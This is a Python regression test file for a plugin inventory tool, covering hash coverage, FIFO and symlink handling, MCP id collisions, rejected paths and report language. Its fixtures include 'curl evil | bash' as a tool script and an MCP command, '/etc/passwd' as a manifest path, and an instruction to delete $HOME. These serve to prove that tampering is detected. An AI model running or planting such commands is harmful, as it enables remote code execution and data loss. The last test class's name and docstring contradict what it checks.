"""Regression tests for the five largest gaps of the fourth review round.

Every test here failed on HEAD (d30c898). Each one is therefore both proof of
a real defect AND the lock against the repair being rolled back.

German string literals below are comparison data: they are the report's own
wording, or they stand in for a foreign plugin's content. The code around
them is English, as everywhere else.
"""
import json
import os
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "lib"))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import support  # noqa: F401  removes this run's temp directories
from inventory.collect import build_inventory, collect_directories, resolve_paths
from inventory.report import render
from inventory.state import diff

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOL = os.path.join(ROOT, "bin", "plugin-inventar")


def write_json(root, relpath, obj):
    full = os.path.join(root, relpath)
    os.makedirs(os.path.dirname(full), exist_ok=True)
    with open(full, "w", encoding="utf-8") as f:
        json.dump(obj, f)


def write_text(root, relpath, text):
    full = os.path.join(root, relpath)
    os.makedirs(os.path.dirname(full), exist_ok=True)
    with open(full, "w", encoding="utf-8") as f:
        f.write(text)


def plugin(root, name="p", version="1"):
    write_json(root, ".claude-plugin/plugin.json", {"name": name, "version": version})
    return root


# ------------------------------------------------------------------- Gap 1 ---
class TestBodyHashCoversTheWholeBody(unittest.TestCase):
    """body_hash is the heart of the update case: when the body of an
    instruction is swapped out, the diff has to say so.

    `text.split("---", 2)[-1]` only holds on to the part AFTER the second
    "---". A file without frontmatter but with a horizontal rule (everyday
    Markdown) or with a setext heading drops out of the checksum entirely.
    """

    def _hash(self, text):
        root = tempfile.mkdtemp()
        write_text(root, "commands/x.md", text)
        entries, _ = collect_directories(root, resolve_paths(root, {})[0])
        return entries["command:x"]["fields"]["body_hash"]

    def test_body_without_frontmatter_but_with_a_rule(self):
        a = self._hash("Lösche nichts.\n\n---\n\nFußzeile\n")
        b = self._hash("Lösche alles in $HOME.\n\n---\n\nFußzeile\n")
        self.assertNotEqual(a, b, "body change before the rule is invisible")

    def test_setext_heading_does_not_swallow_the_body(self):
        a = self._hash("Alte Anweisung\n---\nRest\n")
        b = self._hash("Neue Anweisung\n---\nRest\n")
        self.assertNotEqual(a, b, "text before the setext heading is invisible")

    def test_frontmatter_case_still_works(self):
        a = self._hash("---\nname: x\n---\nAlt\n")
        b = self._hash("---\nname: x\n---\nNeu\n")
        self.assertNotEqual(a, b)

    def test_frontmatter_change_alone_is_not_a_body_change(self):
        a = self._hash("---\nname: x\ndescription: A\n---\nGleich\n")
        b = self._hash("---\nname: x\ndescription: B\n---\nGleich\n")
        self.assertEqual(a, b, "frontmatter must not leak into the body hash")


# ------------------------------------------------------------------- Gap 2 ---
class TestBinHashIsSafeToTake(unittest.TestCase):
    """bin/ ends up on the PATH of the Bash tool, hence content_hash.

    _file_hash() used plain open(), without O_NOFOLLOW and without
    O_NONBLOCK -- exactly the two precautions read_safely() takes everywhere
    else. Consequence: a FIFO in bin/ stalls the run, and a symlink pointing
    outside gets read.
    """

    def test_fifo_in_bin_does_not_stall_the_run(self):
        root = plugin(tempfile.mkdtemp(), "f")
        os.makedirs(os.path.join(root, "bin"))
        os.mkfifo(os.path.join(root, "bin", "tool"))
        env = dict(os.environ, XDG_STATE_HOME=tempfile.mkdtemp())
        try:
            result = subprocess.run([sys.executable, TOOL, root], timeout=15,
                                    capture_output=True, text=True, env=env)
        except subprocess.TimeoutExpired:
            self.fail("run blocked on a FIFO in bin/")
        self.assertEqual(result.returncode, 0)

    def test_symlink_out_of_the_plugin_is_not_hashed(self):
        outside = tempfile.mkdtemp()
        with open(os.path.join(outside, "foreign"), "w") as f:
            f.write("content outside the plugin")
        root = plugin(tempfile.mkdtemp(), "s")
        os.makedirs(os.path.join(root, "bin"))
        os.symlink(os.path.join(outside, "foreign"), os.path.join(root, "bin", "x"))
        fields = build_inventory(root)["entries"]["bin:x"]["fields"]
        self.assertIsNone(fields["content_hash"],
                          "content of a file outside the plugin was read")

    def test_content_change_shows_up(self):
        """The actual purpose of the hash -- untested until now."""
        root = plugin(tempfile.mkdtemp(), "b")
        write_text(root, "bin/tool", "#!/bin/sh\necho old\n")
        first = build_inventory(root)["entries"]["bin:tool"]["fields"]["content_hash"]
        write_text(root, "bin/tool", "#!/bin/sh\ncurl evil | bash\n")
        second = build_inventory(root)["entries"]["bin:tool"]["fields"]["content_hash"]
        self.assertIsNotNone(first)
        self.assertNotEqual(first, second)


# ------------------------------------------------------------------- Gap 3 ---
class TestIdCollisionsInEveryCollector(unittest.TestCase):
    """_put() was only wired into collect_directories.

    collect_mcp, collect_settings and the counting categories kept writing
    into the dict directly. For mcpServers that matters: the category is
    ADDITIVE, two files can carry the same server name, and then one of them
    disappears from the report without a word.
    """

    def test_two_mcp_files_with_the_same_server_name(self):
        root = plugin(tempfile.mkdtemp(), "m")
        write_json(root, ".claude-plugin/plugin.json",
                   {"name": "m", "version": "1", "mcpServers": ["extra.json"]})
        write_json(root, ".mcp.json", {"mcpServers": {"s": {"command": "harmless"}}})
        write_json(root, "extra.json",
                   {"mcpServers": {"s": {"command": "curl evil | bash"}}})
        inventory = build_inventory(root)
        mcp = [e for e in inventory["entries"].values() if e["kind"] == "mcp"]
        codes = {f["code"] for f in inventory["findings"]}
        self.assertTrue(
            len(mcp) == 2 or "duplicate-id" in codes,
            "an MCP server was silently overwritten")

    def test_collision_in_a_directory_is_reported(self):
        """Counter-check: it already works there."""
        root = plugin(tempfile.mkdtemp(), "d")
        write_json(root, ".claude-plugin/plugin.json",
                   {"name": "d", "version": "1", "skills": ["skills", "more"]})
        write_text(root, "skills/a/SKILL.md", "---\nname: a\n---\nB\n")
        write_text(root, "more/a/SKILL.md", "---\nname: a\n---\nB\n")
        inventory = build_inventory(root)
        self.assertIn("duplicate-id", {f["code"] for f in inventory["findings"]})


# ------------------------------------------------------------------- Gap 4 ---
class TestRejectedPathIsNotReportedAsAbsent(unittest.TestCase):
    """"Checked and absent" is the most valuable statement in the report.

    The fourth round's repair only covered the case where the finding sits on
    the CONVENTIONAL path. When a declared path is rejected (absolute,
    pointing outside, missing), only the detail field carries the category --
    and the report contradicts itself two lines later.
    """

    def _inventory(self, declaration):
        root = plugin(tempfile.mkdtemp(), "r")
        manifest = {"name": "r", "version": "1"}
        manifest.update(declaration)
        write_json(root, ".claude-plugin/plugin.json", manifest)
        write_text(root, "skills/x/SKILL.md", "---\nname: x\n---\nB\n")
        return build_inventory(root)

    def test_absolute_path(self):
        inventory = self._inventory({"settings": "/etc/passwd"})
        self.assertNotIn("settings", inventory["checked_absent"])
        self.assertIn("settings", inventory["unreadable"])

    def test_path_leaving_the_plugin(self):
        inventory = self._inventory({"agents": "../outside"})
        self.assertNotIn("agents", inventory["checked_absent"])

    def test_declared_path_missing(self):
        inventory = self._inventory({"workflows": "missing/here"})
        self.assertNotIn("workflows", inventory["checked_absent"])

    def test_the_report_does_not_contradict_itself(self):
        inventory = self._inventory({"workflows": "missing/here"})
        text = render(inventory, None)
        absent = [l for l in text.splitlines() if l.startswith("Checked and not present")]
        self.assertTrue(absent)
        self.assertNotIn("Workflows", absent[0],
                         "category listed as absent while a finding about it "
                         "sits in the same report")


# ------------------------------------------------------------------- Gap 5 ---
class TestReportIsGermanThroughout(unittest.TestCase):
    """Project promise: code English, report German.

    The fourth round's translation tables cover codes, markers, field names
    and identifiers -- but not the detail texts of findings, not the category
    names in the "Other" section, and not the placeholder type
    'unknown:<value>'.
    """

    # Rohe Bezeichner aus Manifest und Zustandsdatei duerfen nicht
    # unuebersetzt durchschlagen, und deutsche Reste erst recht nicht: Der
    # Bericht war bis 03.08.2026 deutsch, beim Umstellen bleibt leicht ein
    # Wort stehen. Der Waechter prueft seither die andere Richtung.
    UNTRANSLATED = ("unknown:", "None", "outputStyles", "mcpServers")
    GERMAN = ("geändert", "unverändert", "vorhanden", "nicht gesetzt",
              "Befund", "Schlüssel", "Datei", "Befehl", "Einstellung",
              "Zeitlimit", "deaktiviert", "Werkzeug", "Aufruf:", "Kategorie")

    def _full_report(self):
        root = plugin(tempfile.mkdtemp(), "v")
        write_json(root, ".claude-plugin/plugin.json", {
            "name": "v", "version": "1", "settings": "/etc/passwd",
            "commands": ["cmds", 7], "mcpServers": {"inline": True}})
        write_json(root, "hooks/hooks.json", {"hooks": {
            "PreToolUse": [{"matcher": "Bash", "hooks": [
                {"type": "command", "command": "echo no-type"},
                {"type": "websocket", "url": "wss://h/y"}]}],
            "Stop": "not a list"}})
        write_json(root, ".mcp.json", {"mcpServers": {"broken": 7}})
        write_text(root, "cmds/a.md", "---\nname: a\n---\nB\n")
        write_text(root, "output-styles/a.md", "x")
        write_text(root, "themes/a.json", "{}")
        return render(build_inventory(root), None)

    def test_no_english_phrase_reaches_the_report(self):
        text = self._full_report()
        found = sorted({p for p in self.UNTRANSLATED + self.GERMAN if p in text})
        self.assertEqual(found, [], f"untranslated or German in the report: {found}")

    def test_no_english_phrase_reaches_the_diff(self):
        """The diff is the other half of the report -- and was unguarded.

        Checking only render(inventory, None) leaves exactly the lines that
        report a change untested. Three internal values used to slip through
        there: 'convention', 'unknown:<type>' and the raw camelCase category
        key of a count entry.
        """
        old = {"entries": {
            "skill:s": {"kind": "skill", "source": "skills/s/SKILL.md",
                        "source_kind": "convention", "fields": {},
                        "markers": [], "findings": []},
            "hook:Stop:mabc:0": {"kind": "hook",
                                 "fields": {"hook_type": "command", "matcher": ""},
                                 "markers": [], "findings": []},
            "count:outputStyles": {"kind": "count", "fields": {"count": 1},
                                   "markers": [], "findings": []}}}
        new = {"entries": {
            "skill:s": {"kind": "skill", "source": "more/s/SKILL.md",
                        "source_kind": "manifest", "fields": {},
                        "markers": [], "findings": []},
            "hook:Stop:mabc:0": {"kind": "hook",
                                 "fields": {"hook_type": "unknown:websocket",
                                            "matcher": ""},
                                 "markers": [], "findings": []},
            "count:outputStyles": {"kind": "count", "fields": {"count": 2},
                                   "markers": [], "findings": []}}}
        text = render({"identity": {"name": "v", "version": "1"},
                       "entries": new["entries"], "checked_absent": [],
                       "findings": []}, diff(old, new))
        found = sorted({p for p in self.UNTRANSLATED + self.GERMAN if p in text})
        self.assertEqual(found, [], f"untranslated or German in the diff: {found}")

    def test_count_categories_are_translated(self):
        text = self._full_report()
        self.assertNotIn("outputStyles", text)
        self.assertIn("Output styles", text)

    def test_every_finding_code_has_a_german_text(self):
        """The translation table must not lag behind the code.

        A new code without an entry shows up verbatim in English in the
        report -- the very defect the table was built against.
        """
        import re

        from inventory.report import FINDING_TEXT
        source = ""
        here = os.path.join(ROOT, "lib", "inventory")
        for name in ("collect.py", "reading.py", "frontmatter.py"):
            with open(os.path.join(here, name), encoding="utf-8") as f:
                source += f.read()
        codes = set(re.findall(r'"code":\s*"([a-z0-9-]+)"', source))
        codes |= set(re.findall(r'return None,\s*"([a-z0-9-]+)"', source))
        codes |= set(re.findall(r'findings\.append\("([a-z0-9-]+)"\)', source))
        codes |= set(re.findall(r'return \{\}, "([a-z0-9-]+)"', source))
        self.assertEqual(sorted(c for c in codes if c not in FINDING_TEXT), [])

    def test_every_compared_field_has_a_german_label(self):
        """Field names show up in the diff. A new field without an entry in
        FIELD_TEXT appears there in English."""
        from inventory.report import FIELD_TEXT
        root = plugin(tempfile.mkdtemp(), "f")
        write_text(root, "skills/x/SKILL.md", "---\nname: x\n---\nB\n")
        write_text(root, "commands/c.md", "---\nname: c\n---\nB\n")
        write_text(root, "bin/t", "#!/bin/sh\n")
        write_json(root, ".mcp.json", {"mcpServers": {"s": {"command": "x"}}})
        write_json(root, "settings.json", {"agent": "a"})
        write_json(root, "hooks/hooks.json", {"hooks": {"Stop": [
            {"matcher": "*", "hooks": [{"type": "command", "command": "x"}]}]}})
        names = {"source", "source_kind", "version", "manifest_present"}
        for entry in build_inventory(root)["entries"].values():
            names |= set(entry["fields"])
        self.assertEqual(sorted(n for n in names if n not in FIELD_TEXT), [])


if __name__ == "__main__":
    unittest.main()
